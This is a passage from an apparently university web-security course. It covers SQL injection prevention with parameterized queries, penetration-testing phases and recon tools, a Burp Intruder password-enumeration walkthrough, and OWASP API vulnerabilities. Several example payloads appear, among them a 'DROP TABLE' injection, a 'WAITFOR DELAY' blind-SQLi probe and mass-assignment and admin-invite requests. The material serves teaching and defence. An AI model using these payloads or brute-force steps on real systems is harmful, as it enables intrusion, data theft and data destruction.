</span></span></code></pre></div><p>Because for this piece of code we do not use the parameterization, the code that will be executed will become:</p><p><code>SELECT * FROM user WHERE username = ''; DROP TABLE user; --';</code></p><h3 id=how-to-prevent-blind-sql-injection-attacks>How to prevent <strong>blind</strong> SQL injection attacks?</h3><p>Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same regardless of whether the vulnerability is blind or not.</p><h2 id=how-to-prevent-sql-injection>How to prevent SQL injection</h2><p>Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.</p><p>The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#000>String</span> <span style=color:#000>query</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;SELECT * FROM products WHERE category = &#39;&#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>input</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#4e9a06>&#34;&#39;&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000>Statement</span> <span style=color:#000>statement</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>connection</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>createStatement</span><span style=color:#000;font-weight:700>();</span>
</span></span><span style=display:flex><span><span style=color:#000>ResultSet</span> <span style=color:#000>resultSet</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>statement</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>executeQuery</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>query</span><span style=color:#000;font-weight:700>);</span>
</span></span></code></pre></div><p>This code can be easily rewritten in a way that prevents the user input from interfering with the query structure:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#000>PreparedStatement</span> <span style=color:#000>statement</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>connection</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>prepareStatement</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;SELECT * FROM products WHERE category = ?&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#000>statement</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>setString</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>input</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#000>ResultSet</span> <span style=color:#000>resultSet</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>statement</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>executeQuery</span><span style=color:#000;font-weight:700>();</span>
</span></span></code></pre></div><p>Parameterized queries can be used for any situation where untrusted input appears as data within the query, including the <code>WHERE</code> clause and values in an <code>INSERT</code> or <code>UPDATE</code> statement.
They can&rsquo;t be used to handle untrusted input in other parts of the query, such as table or column names, or the <code>ORDER BY</code> clause.
Application functionality that places untrusted data into those parts of the query will need to take a different approach, such as white-listing permitted input values, or using different logic to deliver the required behavior.</p><p>For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant, and must never contain any variable data from any origin.
Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe.
It is all too easy to make mistakes about the possible origin of data, or for changes in other code to violate assumptions about what data is tainted.</p><h1 id=tools>Tools</h1><h2 id=burp-suite>Burp Suite</h2><p><a href=https://portswigger.net/burp>Burp Suite</a> is one of the most popular penetration testing and vulnerability finder tools, and is often used for checking web application security.
With this tool you can see all the requests that are executed when interacting with a web application.
You can change the requests to see different behaviors and you can set automatic requests with different parameters.</p><h2 id=sqlmap>SQLmap</h2><p><a href=https://sqlmap.org/>SQLmap</a> is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.
It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
You can see some of the features in this recording.
<a href=https://asciinema.org/a/434673><img src=https://asciinema.org/a/434673.svg alt=asciicast></a></p><h1 id=further-reading>Further Reading</h1><p><strong>1.</strong> <a href=https://portswigger.net/burp>Burp</a><br><strong>2.</strong> <a href=https://portswigger.net/support/configuring-your-browser-to-work-with-burp>Burp Browser Configuration</a><br><strong>3.</strong> <a href=https://portswigger.net/support/checking-your-browser-proxy-configuration>Burp Proxy Configuration</a><br><strong>4.</strong> <a href=https://portswigger.net/support/installing-burp-suites-ca-certificate-in-your-browser>Burp Certificate</a><br><strong>5.</strong> <a href=https://portswigger.net/web-security/sql-injection/cheat-sheet>SQL Cheat Sheet</a><br><strong>6.</strong> <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection>SQL Payloads</a><br><strong>7.</strong> <a href=https://sqlmap.org/>SQLmap</a></p><h1 id=activities>Activities</h1><p><strong>1.</strong> <a href=https://sss-ctf.security.cs.pub.ro/challenges>Demo SQL Injection</a>
<strong>2.</strong> <a href=https://sss-ctf.security.cs.pub.ro/challenges>Blacklist</a>
<strong>3.</strong> <a href=https://sss-ctf.security.cs.pub.ro/challenges>Nightmare Store</a>
<strong>4.</strong> <a href=https://sss-ctf.security.cs.pub.ro/challenges>One by one</a>
<strong>5.</strong> <a href=https://sss-ctf.security.cs.pub.ro/challenges>T0p S3cr3t</a>
<strong>6.</strong> <a href=https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data>Retrieve hidden data</a><br><strong>7.</strong> <a href=https://portswigger.net/web-security/sql-injection/lab-login-bypass>Login bypass</a><br><strong>8.</strong> <a href=https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns>Determine number of columns</a><br><strong>9.</strong> <a href=https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text>Find column</a><br><strong>10.</strong> <a href=https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables>Retrieve data from other tables</a><br><strong>11.</strong> <a href=https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column>Single column</a><br><strong>12.</strong> <a href=https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle>What version?</a><br><strong>13.</strong> <a href=https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft>More versions</a><br><strong>14.</strong> <a href=https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses>Conditional responses</a><br><strong>15.</strong> <a href=https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors>Conditional errors</a><br><strong>16.</strong> <a href=https://portswigger.net/web-security/sql-injection/blind/lab-time-delays>Time delays</a><br><strong>17.</strong> <a href=https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band>Out-of-band Application Security Testing</a></p></div><div class=td-content style=page-break-before:always><h1 id=pg-e8a4b127c58a39d643c27e9bb530772d>5 -</h1><h1 id=recon--enumeration--recap>Recon & Enumeration & Recap</h1><p>When it comes to hacking, knowledge is power.
The more knowledge you have about a target system or network, the more options you have available.
This session will put together all you have learned so far to give you an overview of how to approach a given target you want to exploit.
You will also find out about some more security tools that can help you automate the process.</p><h2 id=phases-of-penetration-testing>Phases of Penetration Testing</h2><p>Penetration testing is an authorized simulated cyber attack on a computer system, performed to evaluate its security.</p><p>A standard penetration testing flow implies 5 stages:</p><ol><li><strong>reconnaissance</strong> - gathering information about the target system: website technologies, subdomains, open ports, Google hacking</li><li><strong>scanning</strong> - manually or automatically (using tools) discovering vulnerabilities in the system, like SQL injection, XSS etc.</li><li><strong>gaining access</strong> using enumeration - exploiting the vulnerabilities found before to collect sensitive information: usernames, machine names, network information, service settings</li><li><strong>maintaining access</strong> - planting hidden programs (like Trojan horses) that make a future attack easier</li><li><strong>covering tracks</strong> - cleaning up all the signs that may lead to thinking that an attack happened</li></ol><p><img src=./assets/pentest_phases.png alt="Penetration testing phases"></p><p>Next, we introduce some popular tools that may help in the first three phases, to gather information about a target.
Exploiting Tools/ Security Testing Tools/ Penetration Testing Tools are used for the discovery of vulnerabilities without attempting to actually exploit them.</p><h1 id=1-reconnaissance>1. Reconnaissance</h1><p>Reconnaissance is an important first stage in any ethical hacking attempt.
Before it is possible to exploit a vulnerability in the target system, it is necessary to find it.
By performing reconnaissance on the target, an ethical hacker can learn about the details of the target network and identify potential attack vectors.</p><h2 id=nmap>Nmap</h2><p><a href=https://insecure.org/>Nmap</a> is probably the most well-known tool for active <strong>network</strong> reconnaissance.
It is a network scanner designed to determine details about a system and the programs running on it.</p><p>Every computer has a total of 65535 available ports; however, many of these are registered as standard ports.
For example, a HTTP web service can nearly always be found on port 80 of the server.
A HTTPS web service can be found on port 443.
If we do not know which of these ports a server has open, then we do not have a hope of successfully attacking the target; thus, it is crucial that we begin any attack with a port scan.
Nmap can be used to perform many different kinds of port scan; the basic theory is this: it will connect to each port of the target in turn.
Depending on how the port responds, it can be determined as being <em>open</em>, <em>closed</em>, or <em>filtered</em> (usually by a firewall).
Once we know which ports are open, we can then look at <em>enumerating</em> which services are running on each port – either manually, or more commonly using nmap.</p><p>Typing the simple command <code>nmap</code> will display all of its options for scanning, while <code>nmap &lt;target></code> will convert the hostname to an IP address and scan the top 1000 TCP ports, displaying their state and the service running on it:</p><p><img src=./assets/nmap_output.png alt="Nmap output"></p><p>You can see the full example <a href=https://nmap.org/book/port-scanning-tutorial.html>here</a> and practice more Nmap options <a href=https://tryhackme.com/room/rpnmap>here</a>.</p><h2 id=shodan>Shodan</h2><p><a href=https://www.shodan.io/>Shodan</a> is a search engine similar to Google.
But while Google searches for websites, Shodan searches for devices that are connected to the internet - from routers and servers, to Internet of Things (IoT) devices, such as thermostats and baby monitors, to complex systems that govern a wide range of industries, including energy, power, and transportation.
You can use a variety of search filters: port, IP address, city etc.
If your internet-facing devices aren’t protected, Shodan can tell hackers everything they need to know to break into your network.</p><h1 id=2-scanning>2. Scanning</h1><h2 id=owasp-zap>OWASP Zap</h2><p>The <a href=https://owasp.org/>Open Web Application Security Project</a> (OWASP) is a nonprofit foundation that works to improve the security of software.
The <a href=https://owasp.org/www-project-top-ten/>OWASP Top 10</a> is a standard awareness document for developers and web application security.
It represents a broad consensus about the most critical security risks to web applications and is updated every 3 years.</p><p>Developed by OWASP, <a href=https://www.zaproxy.org/>ZAP</a> or Zed Attack Proxy is a multi-platform, open source web application security testing tool. ZAP is used for finding a number of security vulnerabilities in a web app during the development as well as testing phase.
Other than its use as a scanner, ZAP can also be used to intercept a proxy for manually testing a web page.
ZAP can identify:</p><ul><li>Application error disclosure</li><li>Cookie not marked with the HttpOnly flag</li><li>Missing anti-CSRF tokens and security headers</li><li>Private IP disclosure</li><li>Session ID in URL rewrite</li><li>SQL injection</li><li>XSS injection</li></ul><p>You can read about other active recon tools <a href=https://resources.infosecinstitute.com/topic/top-10-network-recon-tools/#gref>here</a>: Nessus, OpenVAS, Nikto, Metasploit, <a href=https://pentest-tools.com/website-vulnerability-scanning/website-scanner>Pentest-Tools Website Scanner</a>.</p><h1 id=3-enumeration>3. Enumeration</h1><h2 id=extracting-common-passwords---burp-intruder>Extracting common passwords - Burp Intruder</h2><p>You were introduced to Burp Proxy in an earlier session.
Now we&rsquo;ll see an example of how to use Intruder in order to enumerate passwords.
With Burp Intruder, customized attacks can be automated against web applications.
Customizing attacks requires that we specify one or more payloads and the position where the payloads will be placed in the website.</p><ul><li>I opened Burp and the built-in Chromium browser (or your browser of choice, but pay attention to setting up the proxy), having the intercept <strong>off</strong>.</li><li>I navigated to <a href=https://sss-ctf.security.cs.pub.ro/home>https://sss-ctf.security.cs.pub.ro/home</a> and tried to log in using the email <strong><a href=mailto:a@a.com>a@a.com</a></strong> and the password <strong>abc123</strong>.</li><li>The POST request can be found in HTTP history. Right click on it to send it to Intruder.</li></ul><p><img src=./assets/send_to_intruder.png alt="Send request to Burp Intruder"></p><ul><li>Let&rsquo;s say we want to try all the passwords from <strong>abc1</strong>, <strong>abc3</strong>, <strong>abc5</strong>&mldr; to <strong>abc100</strong>. Navigate to the <strong>Positions</strong> tab - the payload position is specified with a pair of these characters: <strong>§</strong> called <strong>payload markers</strong>.</li></ul><p><strong>Note!</strong> By default, Burp surrounds by default some parameter values which might be candidates for enumeration, such as cookie values, or POST data values.
Remove the extra <strong>§</strong> characters, leaving it like in the picture below.</p><p><img src=./assets/payload_position.png alt="Set payload position"></p><ol><li>Our payload type (wordlist) is a sequence of numbers which can be automatically generated in Burp. Go to the <strong>Payloads</strong> tab and select <strong>Numbers</strong> as the <strong>Payload type</strong>.</li><li>Fill in the Payload options to generate all the numbers from 1 to 100, with step 2 (1, 3, 5&mldr;).</li><li>Finally, launch the attack.</li></ol><p><img src=./assets/payload_type.png alt="Set payload type"></p><p>A new window opens and you can see all the requests Burp is making, with the payloads you specified.
For example, you can check the request corresponding to the payload 7, with the resulting password being <strong>abc7</strong>, and you can observe the response, its status code, or even open it in the browser.</p><p><img src=./assets/attack_example.png alt="Attack example"></p><p>There are many ways in which you can customize this process according to your needs.
You can have multiple payload positions and select from four attack types, specifying how to insert the payloads (one different wordlist for each position, or combinations of them).
Find more details <a href=https://portswigger.net/burp/documentation/desktop/tools/intruder/positions>here</a>.</p><ul><li><strong>Sniper</strong> - This uses a single set of payloads.
It targets each payload position in turn, and places each payload into that position in turn.
Positions that are not targeted for a given request are not affected - the position markers are removed and any enclosed text that appears between them in the template remains unchanged.
This attack type is useful for fuzzing a number of request parameters individually for common vulnerabilities.
The total number of requests generated in the attack is the product of the number of positions and the number of payloads in the payload set.</li><li><strong>Battering ram</strong> - This uses a single set of payloads.
It iterates through the payloads, and places the same payload into all of the defined payload positions at once.
This attack type is useful where an attack requires the same input to be inserted in multiple places within the request (e.g. a username within a Cookie and a body parameter).
The total number of requests generated in the attack is the number of payloads in the payload set.</li><li><strong>Pitchfork</strong> - This uses multiple payload sets.
There is a different payload set for each defined position (up to a maximum of 20).
The attack iterates through all payload sets simultaneously, and places one payload into each defined position.
In other words, the first request will place the first payload from payload set 1 into position 1 and the first payload from payload set 2 into position 2; the second request will place the second payload from payload set 1 into position 1 and the second payload from payload set 2 into position 2, etc.
This attack type is useful where an attack requires different but related input to be inserted in multiple places within the request (e.g. a username in one parameter, and a known ID number corresponding to that username in another parameter).
The total number of requests generated in the attack is the number of payloads in the smallest payload set.</li><li><strong>Cluster bomb</strong> - This uses multiple payload sets.
There is a different payload set for each defined position (up to a maximum of 20).
The attack iterates through each payload set in turn, so that all permutations of payload combinations are tested. I.e., if there are two payload positions, the attack will place the first payload from payload set 2 into position 2, and iterate through all the payloads in payload set 1 in position 1; it will then place the second payload from payload set 2 into position 2, and iterate through all the payloads in payload set 1 in position 1.
This attack type is useful where an attack requires different and unrelated or unknown input to be inserted in multiple places within the request (e.g. when guessing credentials, a username in one parameter, and a password in another parameter).
The total number of requests generated in the attack is the product of the number of payloads in all defined payload sets - this may be extremely large.</li></ul><p>There are also many different types of payloads you can use (<a href=https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types>here</a> is the entire list), from specifying your own list of words to generating random bytes.
You can find lists of popular credentials online, for instance, <a href=https://github.com/danielmiessler/SecLists/tree/master/Passwords>here</a> is a repo with lists of most used passwords.</p><h2 id=web-content-enumeration-web-content-discovery-dirbusting>Web Content Enumeration/ Web Content Discovery/ Dirbusting</h2><p>Let&rsquo;s say we have the target server <strong><a href=https://security.cs.pub.ro/>https://security.cs.pub.ro/</a></strong> and we want to discover hidden files, directories or other resources there.
Manually, we would make multiple requests like <em><a href=https://security.cs.pub.ro/docs>https://security.cs.pub.ro/docs</a></em>, <em><a href=https://security.cs.pub.ro/config.php>https://security.cs.pub.ro/config.php</a></em> etc. or whatever we imagine might find and see if we get a 404 Not Found response or not.
Luckily, there are command line tools and predefined wordlists in Kali (<strong>/usr/share/wordlists/</strong>) doing exactly this for us.</p><h3 id=dirb>DIRB</h3><p><a href=https://tools.kali.org/web-applications/dirb>DIRB</a> is a Web Content Scanner, a Kali built in tool.
It looks for existing (and/or hidden) Web Objects.
It basically works by launching a dictionary based attack against a web server and analyzing the response.
DIRB comes with a set of preconfigured attack wordlists for easy usage but you can use your custom wordlists.
For each filename, it checks the existence on the web server and returns the results which do not give a 404 Not Found response.</p><p>Usage example: <code>./dirb &lt;url_base> [&lt;wordlist_file(s)>] [options]</code></p><p><img src=./assets/dirb_example.png alt="DIRB example"></p><p>The output lines with the results found (not 404) start with a <code>+</code> and give details about status code and page size.</p><p>You can read the documentation if you want to specify custom options, like custom file extensions to look for.</p><h3 id=similar-tools>Similar tools</h3><ul><li><a href=https://tools.kali.org/web-applications/dirbuster>DirBuster</a> - not maintained anymore, Kali built in, written in Java.
The only one with a GUI and not a CLI.</li><li><a href=https://www.kali.org/tools/dirsearch/>DirSearch</a> - Kali built in & on <a href=(https://github.com/maurosoria/dirsearch)>GitHub</a>, written in Python.</li><li><a href=https://tools.kali.org/web-applications/gobuster>GoBuster</a> - Kali built in & on <a href=https://github.com/OJ/gobuster>GitHub</a>, written in Go.
Can do DNS and VHost busting, S3 buckets enumeration.</li><li><a href=https://github.com/xmendez/wfuzz>wfuzz</a> - on GitHub, written in Python, can be easily installed with pip.</li><li><a href=https://github.com/ffuf/ffuf>ffuf</a> - on GitHub, written in Go, has the option to mutate the files found.
Can do VHost discovery.</li></ul><p>You can find a detailed comparison <a href=https://blog.sec-it.fr/en/2021/02/16/fuzz-dir-tools/>here</a>.
We don&rsquo;t recommend DirBuster and DirSearch since the others are newer, improved and better-maintained tools.
DIRB is also not maintained anymore, but can come in handy if you want to do a quick content discovery, with not many options to configure.</p><h2 id=recap-with-dvwa>Recap with DVWA</h2><p>DVWA (Damn Vulnerable Web Application) is a deliberately vulnerable application which you can use to test your skills and exploit some of the most common web vulnerabilities, like XSS, SQL, LFI, with various difficulty levels.</p><h3 id=setup-instructions>Setup instructions</h3><p>An easy way to deploy DVWA is by using <a href=https://docs.docker.com/get-docker/>Docker</a>, which you need to have installed on your machine.
Then, follow the instructions from <a href=https://hub.docker.com/r/vulnerables/web-dvwa/>here</a>.
After running it, you can simply access it in your browser at http://127.0.0.1:80 (or a different port, if you wish), login and start hacking.</p><h3 id=solutions>Solutions</h3><ul><li>Brute force: <a href=https://medium.com/cyberdefendersprogram/burp-suite-webpage-enumeration-and-vulnerability-testing-cfd0b140570d>https://medium.com/cyberdefendersprogram/burp-suite-webpage-enumeration-and-vulnerability-testing-cfd0b140570d</a></li><li>SQL Injection: <a href=https://medium.com/cyberdefendersprogram/burp-suite-webpage-enumeration-and-vulnerability-testing-cfd0b140570d>https://medium.com/cyberdefendersprogram/burp-suite-webpage-enumeration-and-vulnerability-testing-cfd0b140570d</a></li><li>Blind Sql: <a href=https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7>https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7</a></li><li>CSRF: <a href=https://medium.com/hacker-toolbelt/dvwa-1-9-iv-csrf-b9f2409fd628>https://medium.com/hacker-toolbelt/dvwa-1-9-iv-csrf-b9f2409fd628</a></li><li>File Upload: <a href=https://medium.com/hacker-toolbelt/dvwa-1-9-vi-file-upload-ce77a73b0453>https://medium.com/hacker-toolbelt/dvwa-1-9-vi-file-upload-ce77a73b0453</a></li></ul><h1 id=further-reading>Further Reading</h1><ul><li><a href=https://www.safetydetectives.com/blog/what-is-shodan-and-how-to-use-it-most-effectively/>https://www.safetydetectives.com/blog/what-is-shodan-and-how-to-use-it-most-effectively/</a></li><li><a href=https://hackr.io/blog/top-10-open-source-security-testing-tools-for-web-applications>https://hackr.io/blog/top-10-open-source-security-testing-tools-for-web-applications</a></li><li><a href=https://www.knowledgehut.com/blog/security/enumeration-in-ethical-hacking>https://www.knowledgehut.com/blog/security/enumeration-in-ethical-hacking</a></li><li><a href=https://www.greycampus.com/opencampus/ethical-hacking/enumeration-and-its-types>https://www.greycampus.com/opencampus/ethical-hacking/enumeration-and-its-types</a></li></ul><h3 id=wordlists>Wordlists</h3><ul><li><a href=https://github.com/Bo0oM/fuzz.txt>https://github.com/Bo0oM/fuzz.txt</a></li><li><a href=https://github.com/aels/subdirectories-discover>https://github.com/aels/subdirectories-discover</a></li><li><a href=https://github.com/danielmiessler/SecLists>https://github.com/danielmiessler/SecLists</a></li></ul><h3 id=bug-bounty-program-lists>Bug Bounty Program Lists</h3><ul><li><a href=https://github.com/projectdiscovery/public-bugbounty-programs/blob/master/chaos-bugbounty-list.json>https://github.com/projectdiscovery/public-bugbounty-programs/blob/master/chaos-bugbounty-list.json</a></li><li><a href=https://www.bugcrowd.com/bug-bounty-list/>https://www.bugcrowd.com/bug-bounty-list/</a></li><li><a href=https://hackerone.com/bug-bounty-programs>https://hackerone.com/bug-bounty-programs</a></li></ul><h1 id=activities>Activities</h1><ol><li><a href=https://sss-web.cyberedu.ro/challenge/268a2910-02d8-11ed-9675-abf36c35783f>Not So Random</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/7ba65330-02d8-11ed-9270-29119375f24f>Lamer Login</a></li><li><a href=https://hub.docker.com/r/vulnerables/web-dvwa/>DVWA</a></li></ol></div><div class=td-content style=page-break-before:always><h1 id=pg-fca1ee26cbdcd099d45b25d743b89e27>6 -</h1><h1 id=introduction>Introduction</h1><p>Application programming interfaces (APIs) and frameworks have become a critical part of almost every business.
APIs are responsible for transferring information between systems within a company or to external companies.
API may be a system API or a library API.
Here we talk about web APIs, i.e. APIs provided by web applications.
APIs are means through which a client accesses remote services.
For example, when you log in to a website like Google or Facebook, an API processes your login credentials to verify they are correct.
A framework, or software framework, is a platform for developing software applications.
It provides a foundation on which software developers can build programs for a specific platform.
For example, a framework may include predefined classes and functions that can be used to process input, manage hardware devices, and interact with system software.</p><p>However, given the sensitive data being transferred through APIs, it’s critical to secure them.
Moreover, from time to time people find vulnerabilities for versions of widely used frameworks, which puts numerous web apps at risk.
Therefore, it&rsquo;s best to be up to date and apply security patches as soon as a new vulnerability arises.</p><h1 id=api-vulnerabilities>API Vulnerabilities</h1><p>By nature, APIs expose application logic and sensitive data such as Personally Identifiable Information (PII) and because of this have increasingly become a target for attackers.
PII is any data that could potentially be used to identify a particular person.
Examples include a full name, Social Security number, driver&rsquo;s license number, bank account number, passport number, and email address.</p><h2 id=broken-object-level-authorization>Broken Object Level Authorization</h2><p>An object refers to a data source that is associated with an authenticated entity.
Object-level authorization is all about controlling access based on the scope of permissible user data and object access.
A simple physical world example is a hotel room key which is coded to only open the room you paid for, as opposed to a master key used by a maid that opens all the rooms on the floor.
Attackers can exploit API endpoints that are vulnerable to broken object level authorization by manipulating the ID of an object that is sent within the client request.
What this means is that the client can request information from an API endpoint that they are not supposed to have access to.
This attack normally leads to unauthorized information disclosure, modification, or destruction of data.</p><p><strong>Example Attack Scenario:</strong></p><p>Say for instance there is an e-commerce platform that provides financial and hosted services to a group of different online stores (shops).
The platform provides an API used to gain access to revenue charts for each of their hosted stores, and each store should only have access to their own revenue charts.
However, while inspecting the client request from a single store that wants to gain access to their own revenue charts, an attacker can identify (find) the API endpoint for those revenue charts and identify the URL in use, for example <code>/shops/{shop name}/revenue_data.json</code>.
Using the names of other stores being hosted on the e-commerce platform, an attacker can create a simple script to modify the <code>{shop name}</code> ID object in subsequent requests, and gain access to the revenue charts of every other store.</p><h2 id=broken-authentication>Broken Authentication</h2><p>Being different from Authorization discussed above, Authentication on the other hand is a complex and confusing mechanism concerning APIs.
Since authentication endpoints are exposed to anyone by design, the endpoints that are responsible for user-authentication must be treated differently from regular API endpoints and implement extra layers of protection for credential stuffing attempts, in addition to brute force password and token guessing attacks.</p><p><strong>Example Attack Scenario:</strong></p><p>Suppose that an attacker obtained a list of leaked username/password combinations as the result of a data breach from another organization.
If the API endpoint handling authentication does not implement brute force or credential stuffing protections like CAPTCHA, rate-limiting, account lockout, etc., an attacker can repeatedly attempt to gain access using the list of username/password combinations to determine what combination(s) work.</p><h2 id=excessive-data-exposure>Excessive Data Exposure</h2><p>By design, API endpoints often expose sensitive data since they frequently rely on the client app to perform data filtering.
Attackers exploit this issue by sniffing the traffic to analyze the responses, looking for sensitive data that should not be exposed.
This data is supposed to be filtered on the client app, before being presented to the user.</p><p><strong>Example Attack Scenario:</strong></p><p>Imagine that an IoT-based camera surveillance system allows administrators to add a newly-hired security guard as a system user, and the administrator wants to ensure the new user should only have access to certain cameras.
These cameras are accessible via a mobile app that the security guard uses while at work.
The newly hired security guard’s mobile app makes an API request to an endpoint in order to receive data about the cameras, and relies on the mobile app to filter which cameras the guard has access to.
Although the mobile app only shows the cameras the guard can access, the actual API response contains a full list of all the cameras.
Using the sniffed traffic, an attacker can manipulate the API request to show all cameras, bypassing the filtering on the mobile app.</p><h2 id=lack-of-resources--rate-limiting>Lack of Resources & Rate Limiting</h2><p>It is common to find API endpoints that do not implement any sort of rate limiting on the number of API requests, or they do not limit the type of requests that can consume considerable network, CPU, memory, and storage resources.
The amount of resources required to satisfy a request greatly depends on the user input and endpoint business logic.
Attackers exploit these issues causing denial-of-service attacks and associated endpoint outages.</p><p><strong>Example Attack Scenario:</strong></p><p>Let’s say that an attacker wants to cause a denial-of-service outage to a certain API that contains a very large list of users.
The users’ list can be queried, but the application limits the number of users that can be displayed to 100 users.
A normal request to the application would look like this: <code>/api/users?page=1&size=100</code>.
In this case, the request would return with the first page and the first 100 users.
If the attacker changed the size parameter from 100 to 200000, it could cause a performance issue on the backend database, since the size parameter in use is so large.
As a result, the API becomes unresponsive and is unable to handle further requests from this or any other client.</p><h2 id=broken-function-level-authorization>Broken Function Level Authorization</h2><p>Although different from Broken Object Level Authorization (described above), exploitation of this issue requires the attacker to send API requests to endpoints that they should not have access to, yet are exposed to anonymous users or regular, non-privileged users.
These types of flaws are often easy to find and can allow attackers to access unauthorized functionality.
For example, administrative functions are prime targets for this type of attack.</p><p><strong>Example Attack Scenario:</strong></p><p>To illustrate this further, imagine that during the registration process to a certain application that only allows invited users to join, the mobile app triggers an API request to GET /api/invites/{invite_guid}.
GET is a standard HTTP method used to request information from a particular resource.
In this case, the response to the GET contains details about the invite, including the user’s role and email address.</p><p>Now, say that an attacker duplicated the request and manipulated the HTTP method by changing GET to POST.
POST is a HTTP method used to send information to create or update a resource.
The URL would look like this: <code>POST /api/invites/new/{“email”:”hugo@malicious.com”,”role”:”admin”}</code>.
In this case, the attacker easily exploits this issue and sends himself an email invite to create an admin account.</p><h2 id=mass-assignment>Mass Assignment</h2><p>Modern frameworks encourage developers to use functions that automatically bind input from the client into code variables and internal objects.
What this means is that users should have the ability to update their username, contact details, etc. (within their profiles for example), but they should not be able to change their user-level permissions, adjust account balances, and other administrative-like functions.
An API endpoint is considered vulnerable if it automatically converts the client input into internal object properties, without considering the sensitivity and the exposure level of these properties.
This could allow an attacker to update things that they should not have access to.</p><p><strong>Example Attack Scenario:</strong></p><p>To illustrate this further, imagine that a ride sharing application provides the user the option to edit basic information about themselves in their user profile.
For example, they can adjust their username, age etc.
In this case, the API request would look like this: <code>PUT /api/v1/users/me</code> with the following legitimate information:</p><p><code>{"username":"john","age":24}</code></p><p>However, the attacker determines that the request <code>GET /api/v1/users/me</code> includes an additional credit_balance property (field) as shown below.</p><p><code>{"username":"john","age":24,"credit_balance":10}</code></p><p>The attacker desires to increase their credit balance on their own and replays the first request with the following payload:</p><p><code>{"username":"john","age":24,"credit_balance":99999}</code></p><p>Since the endpoint is vulnerable to mass assignment, the attacker can easily adjust their own <code>credit_balance</code> at will, for example changing it from 10 credits to 99999 as shown above.</p><h2 id=security-misconfiguration>Security Misconfiguration</h2><p>Attackers will often attempt to find unpatched flaws, common endpoints, or unprotected files and directories to gain unauthorized access or knowledge of the system they want to attack.
Security misconfigurations can not only expose sensitive user data, but also system details that may lead to full server compromise.</p><p><strong>Example Attack Scenario:</strong></p><p>Say for instance that an attacker uses a popular search engine like Shodan to search for computers and devices directly accessible from the Internet.
The attacker found a server running a popular database management system, listening on the default TCP port.
The database management system was using the default configuration, which has authentication disabled by default, and the attacker gained access to millions of records with PII, personal preferences, and authentication data.</p><h2 id=injection>Injection</h2><p>Injection flaws, such as SQL, NoSQL, command injection, etc., occur when untrusted data is sent to an interpreter as part of a command or query.
Injection vulnerabilities cause computing systems to potentially process malicious data that attackers introduce.
To put it in its simplest terms, attackers inject code into a vulnerable piece of software and change the way the software is intended to be executed.
As a result, injection attacks can be somewhat disastrous, since they normally lead to data theft, data loss, data corruption, denial of service, etc.</p><p><strong>Example Attack Scenario:</strong></p><p>Suppose an attacker starts inspecting the network traffic of their web browser and identifies the following API request designed to help a user recover their password.
The attacker identifies the request responsible to start the recovery-password process as follows:</p><p><code>POST /api/accounts/recovery {“email”: “john@somehost.com”}</code></p><p>Then the attacker replays the request with a different payload:</p><p><code>POST /api/account/recovery {“email”: “john@somehost.com’;WAITFOR DELAY ‘0:0:5’–“}</code></p><p>By adding the <code>;WAITFOR DELAY ‘0:0:5’–”</code> the attacker observes that the response from the API took ~5 seconds longer, which helps confirm the API is vulnerable to SQL injection.
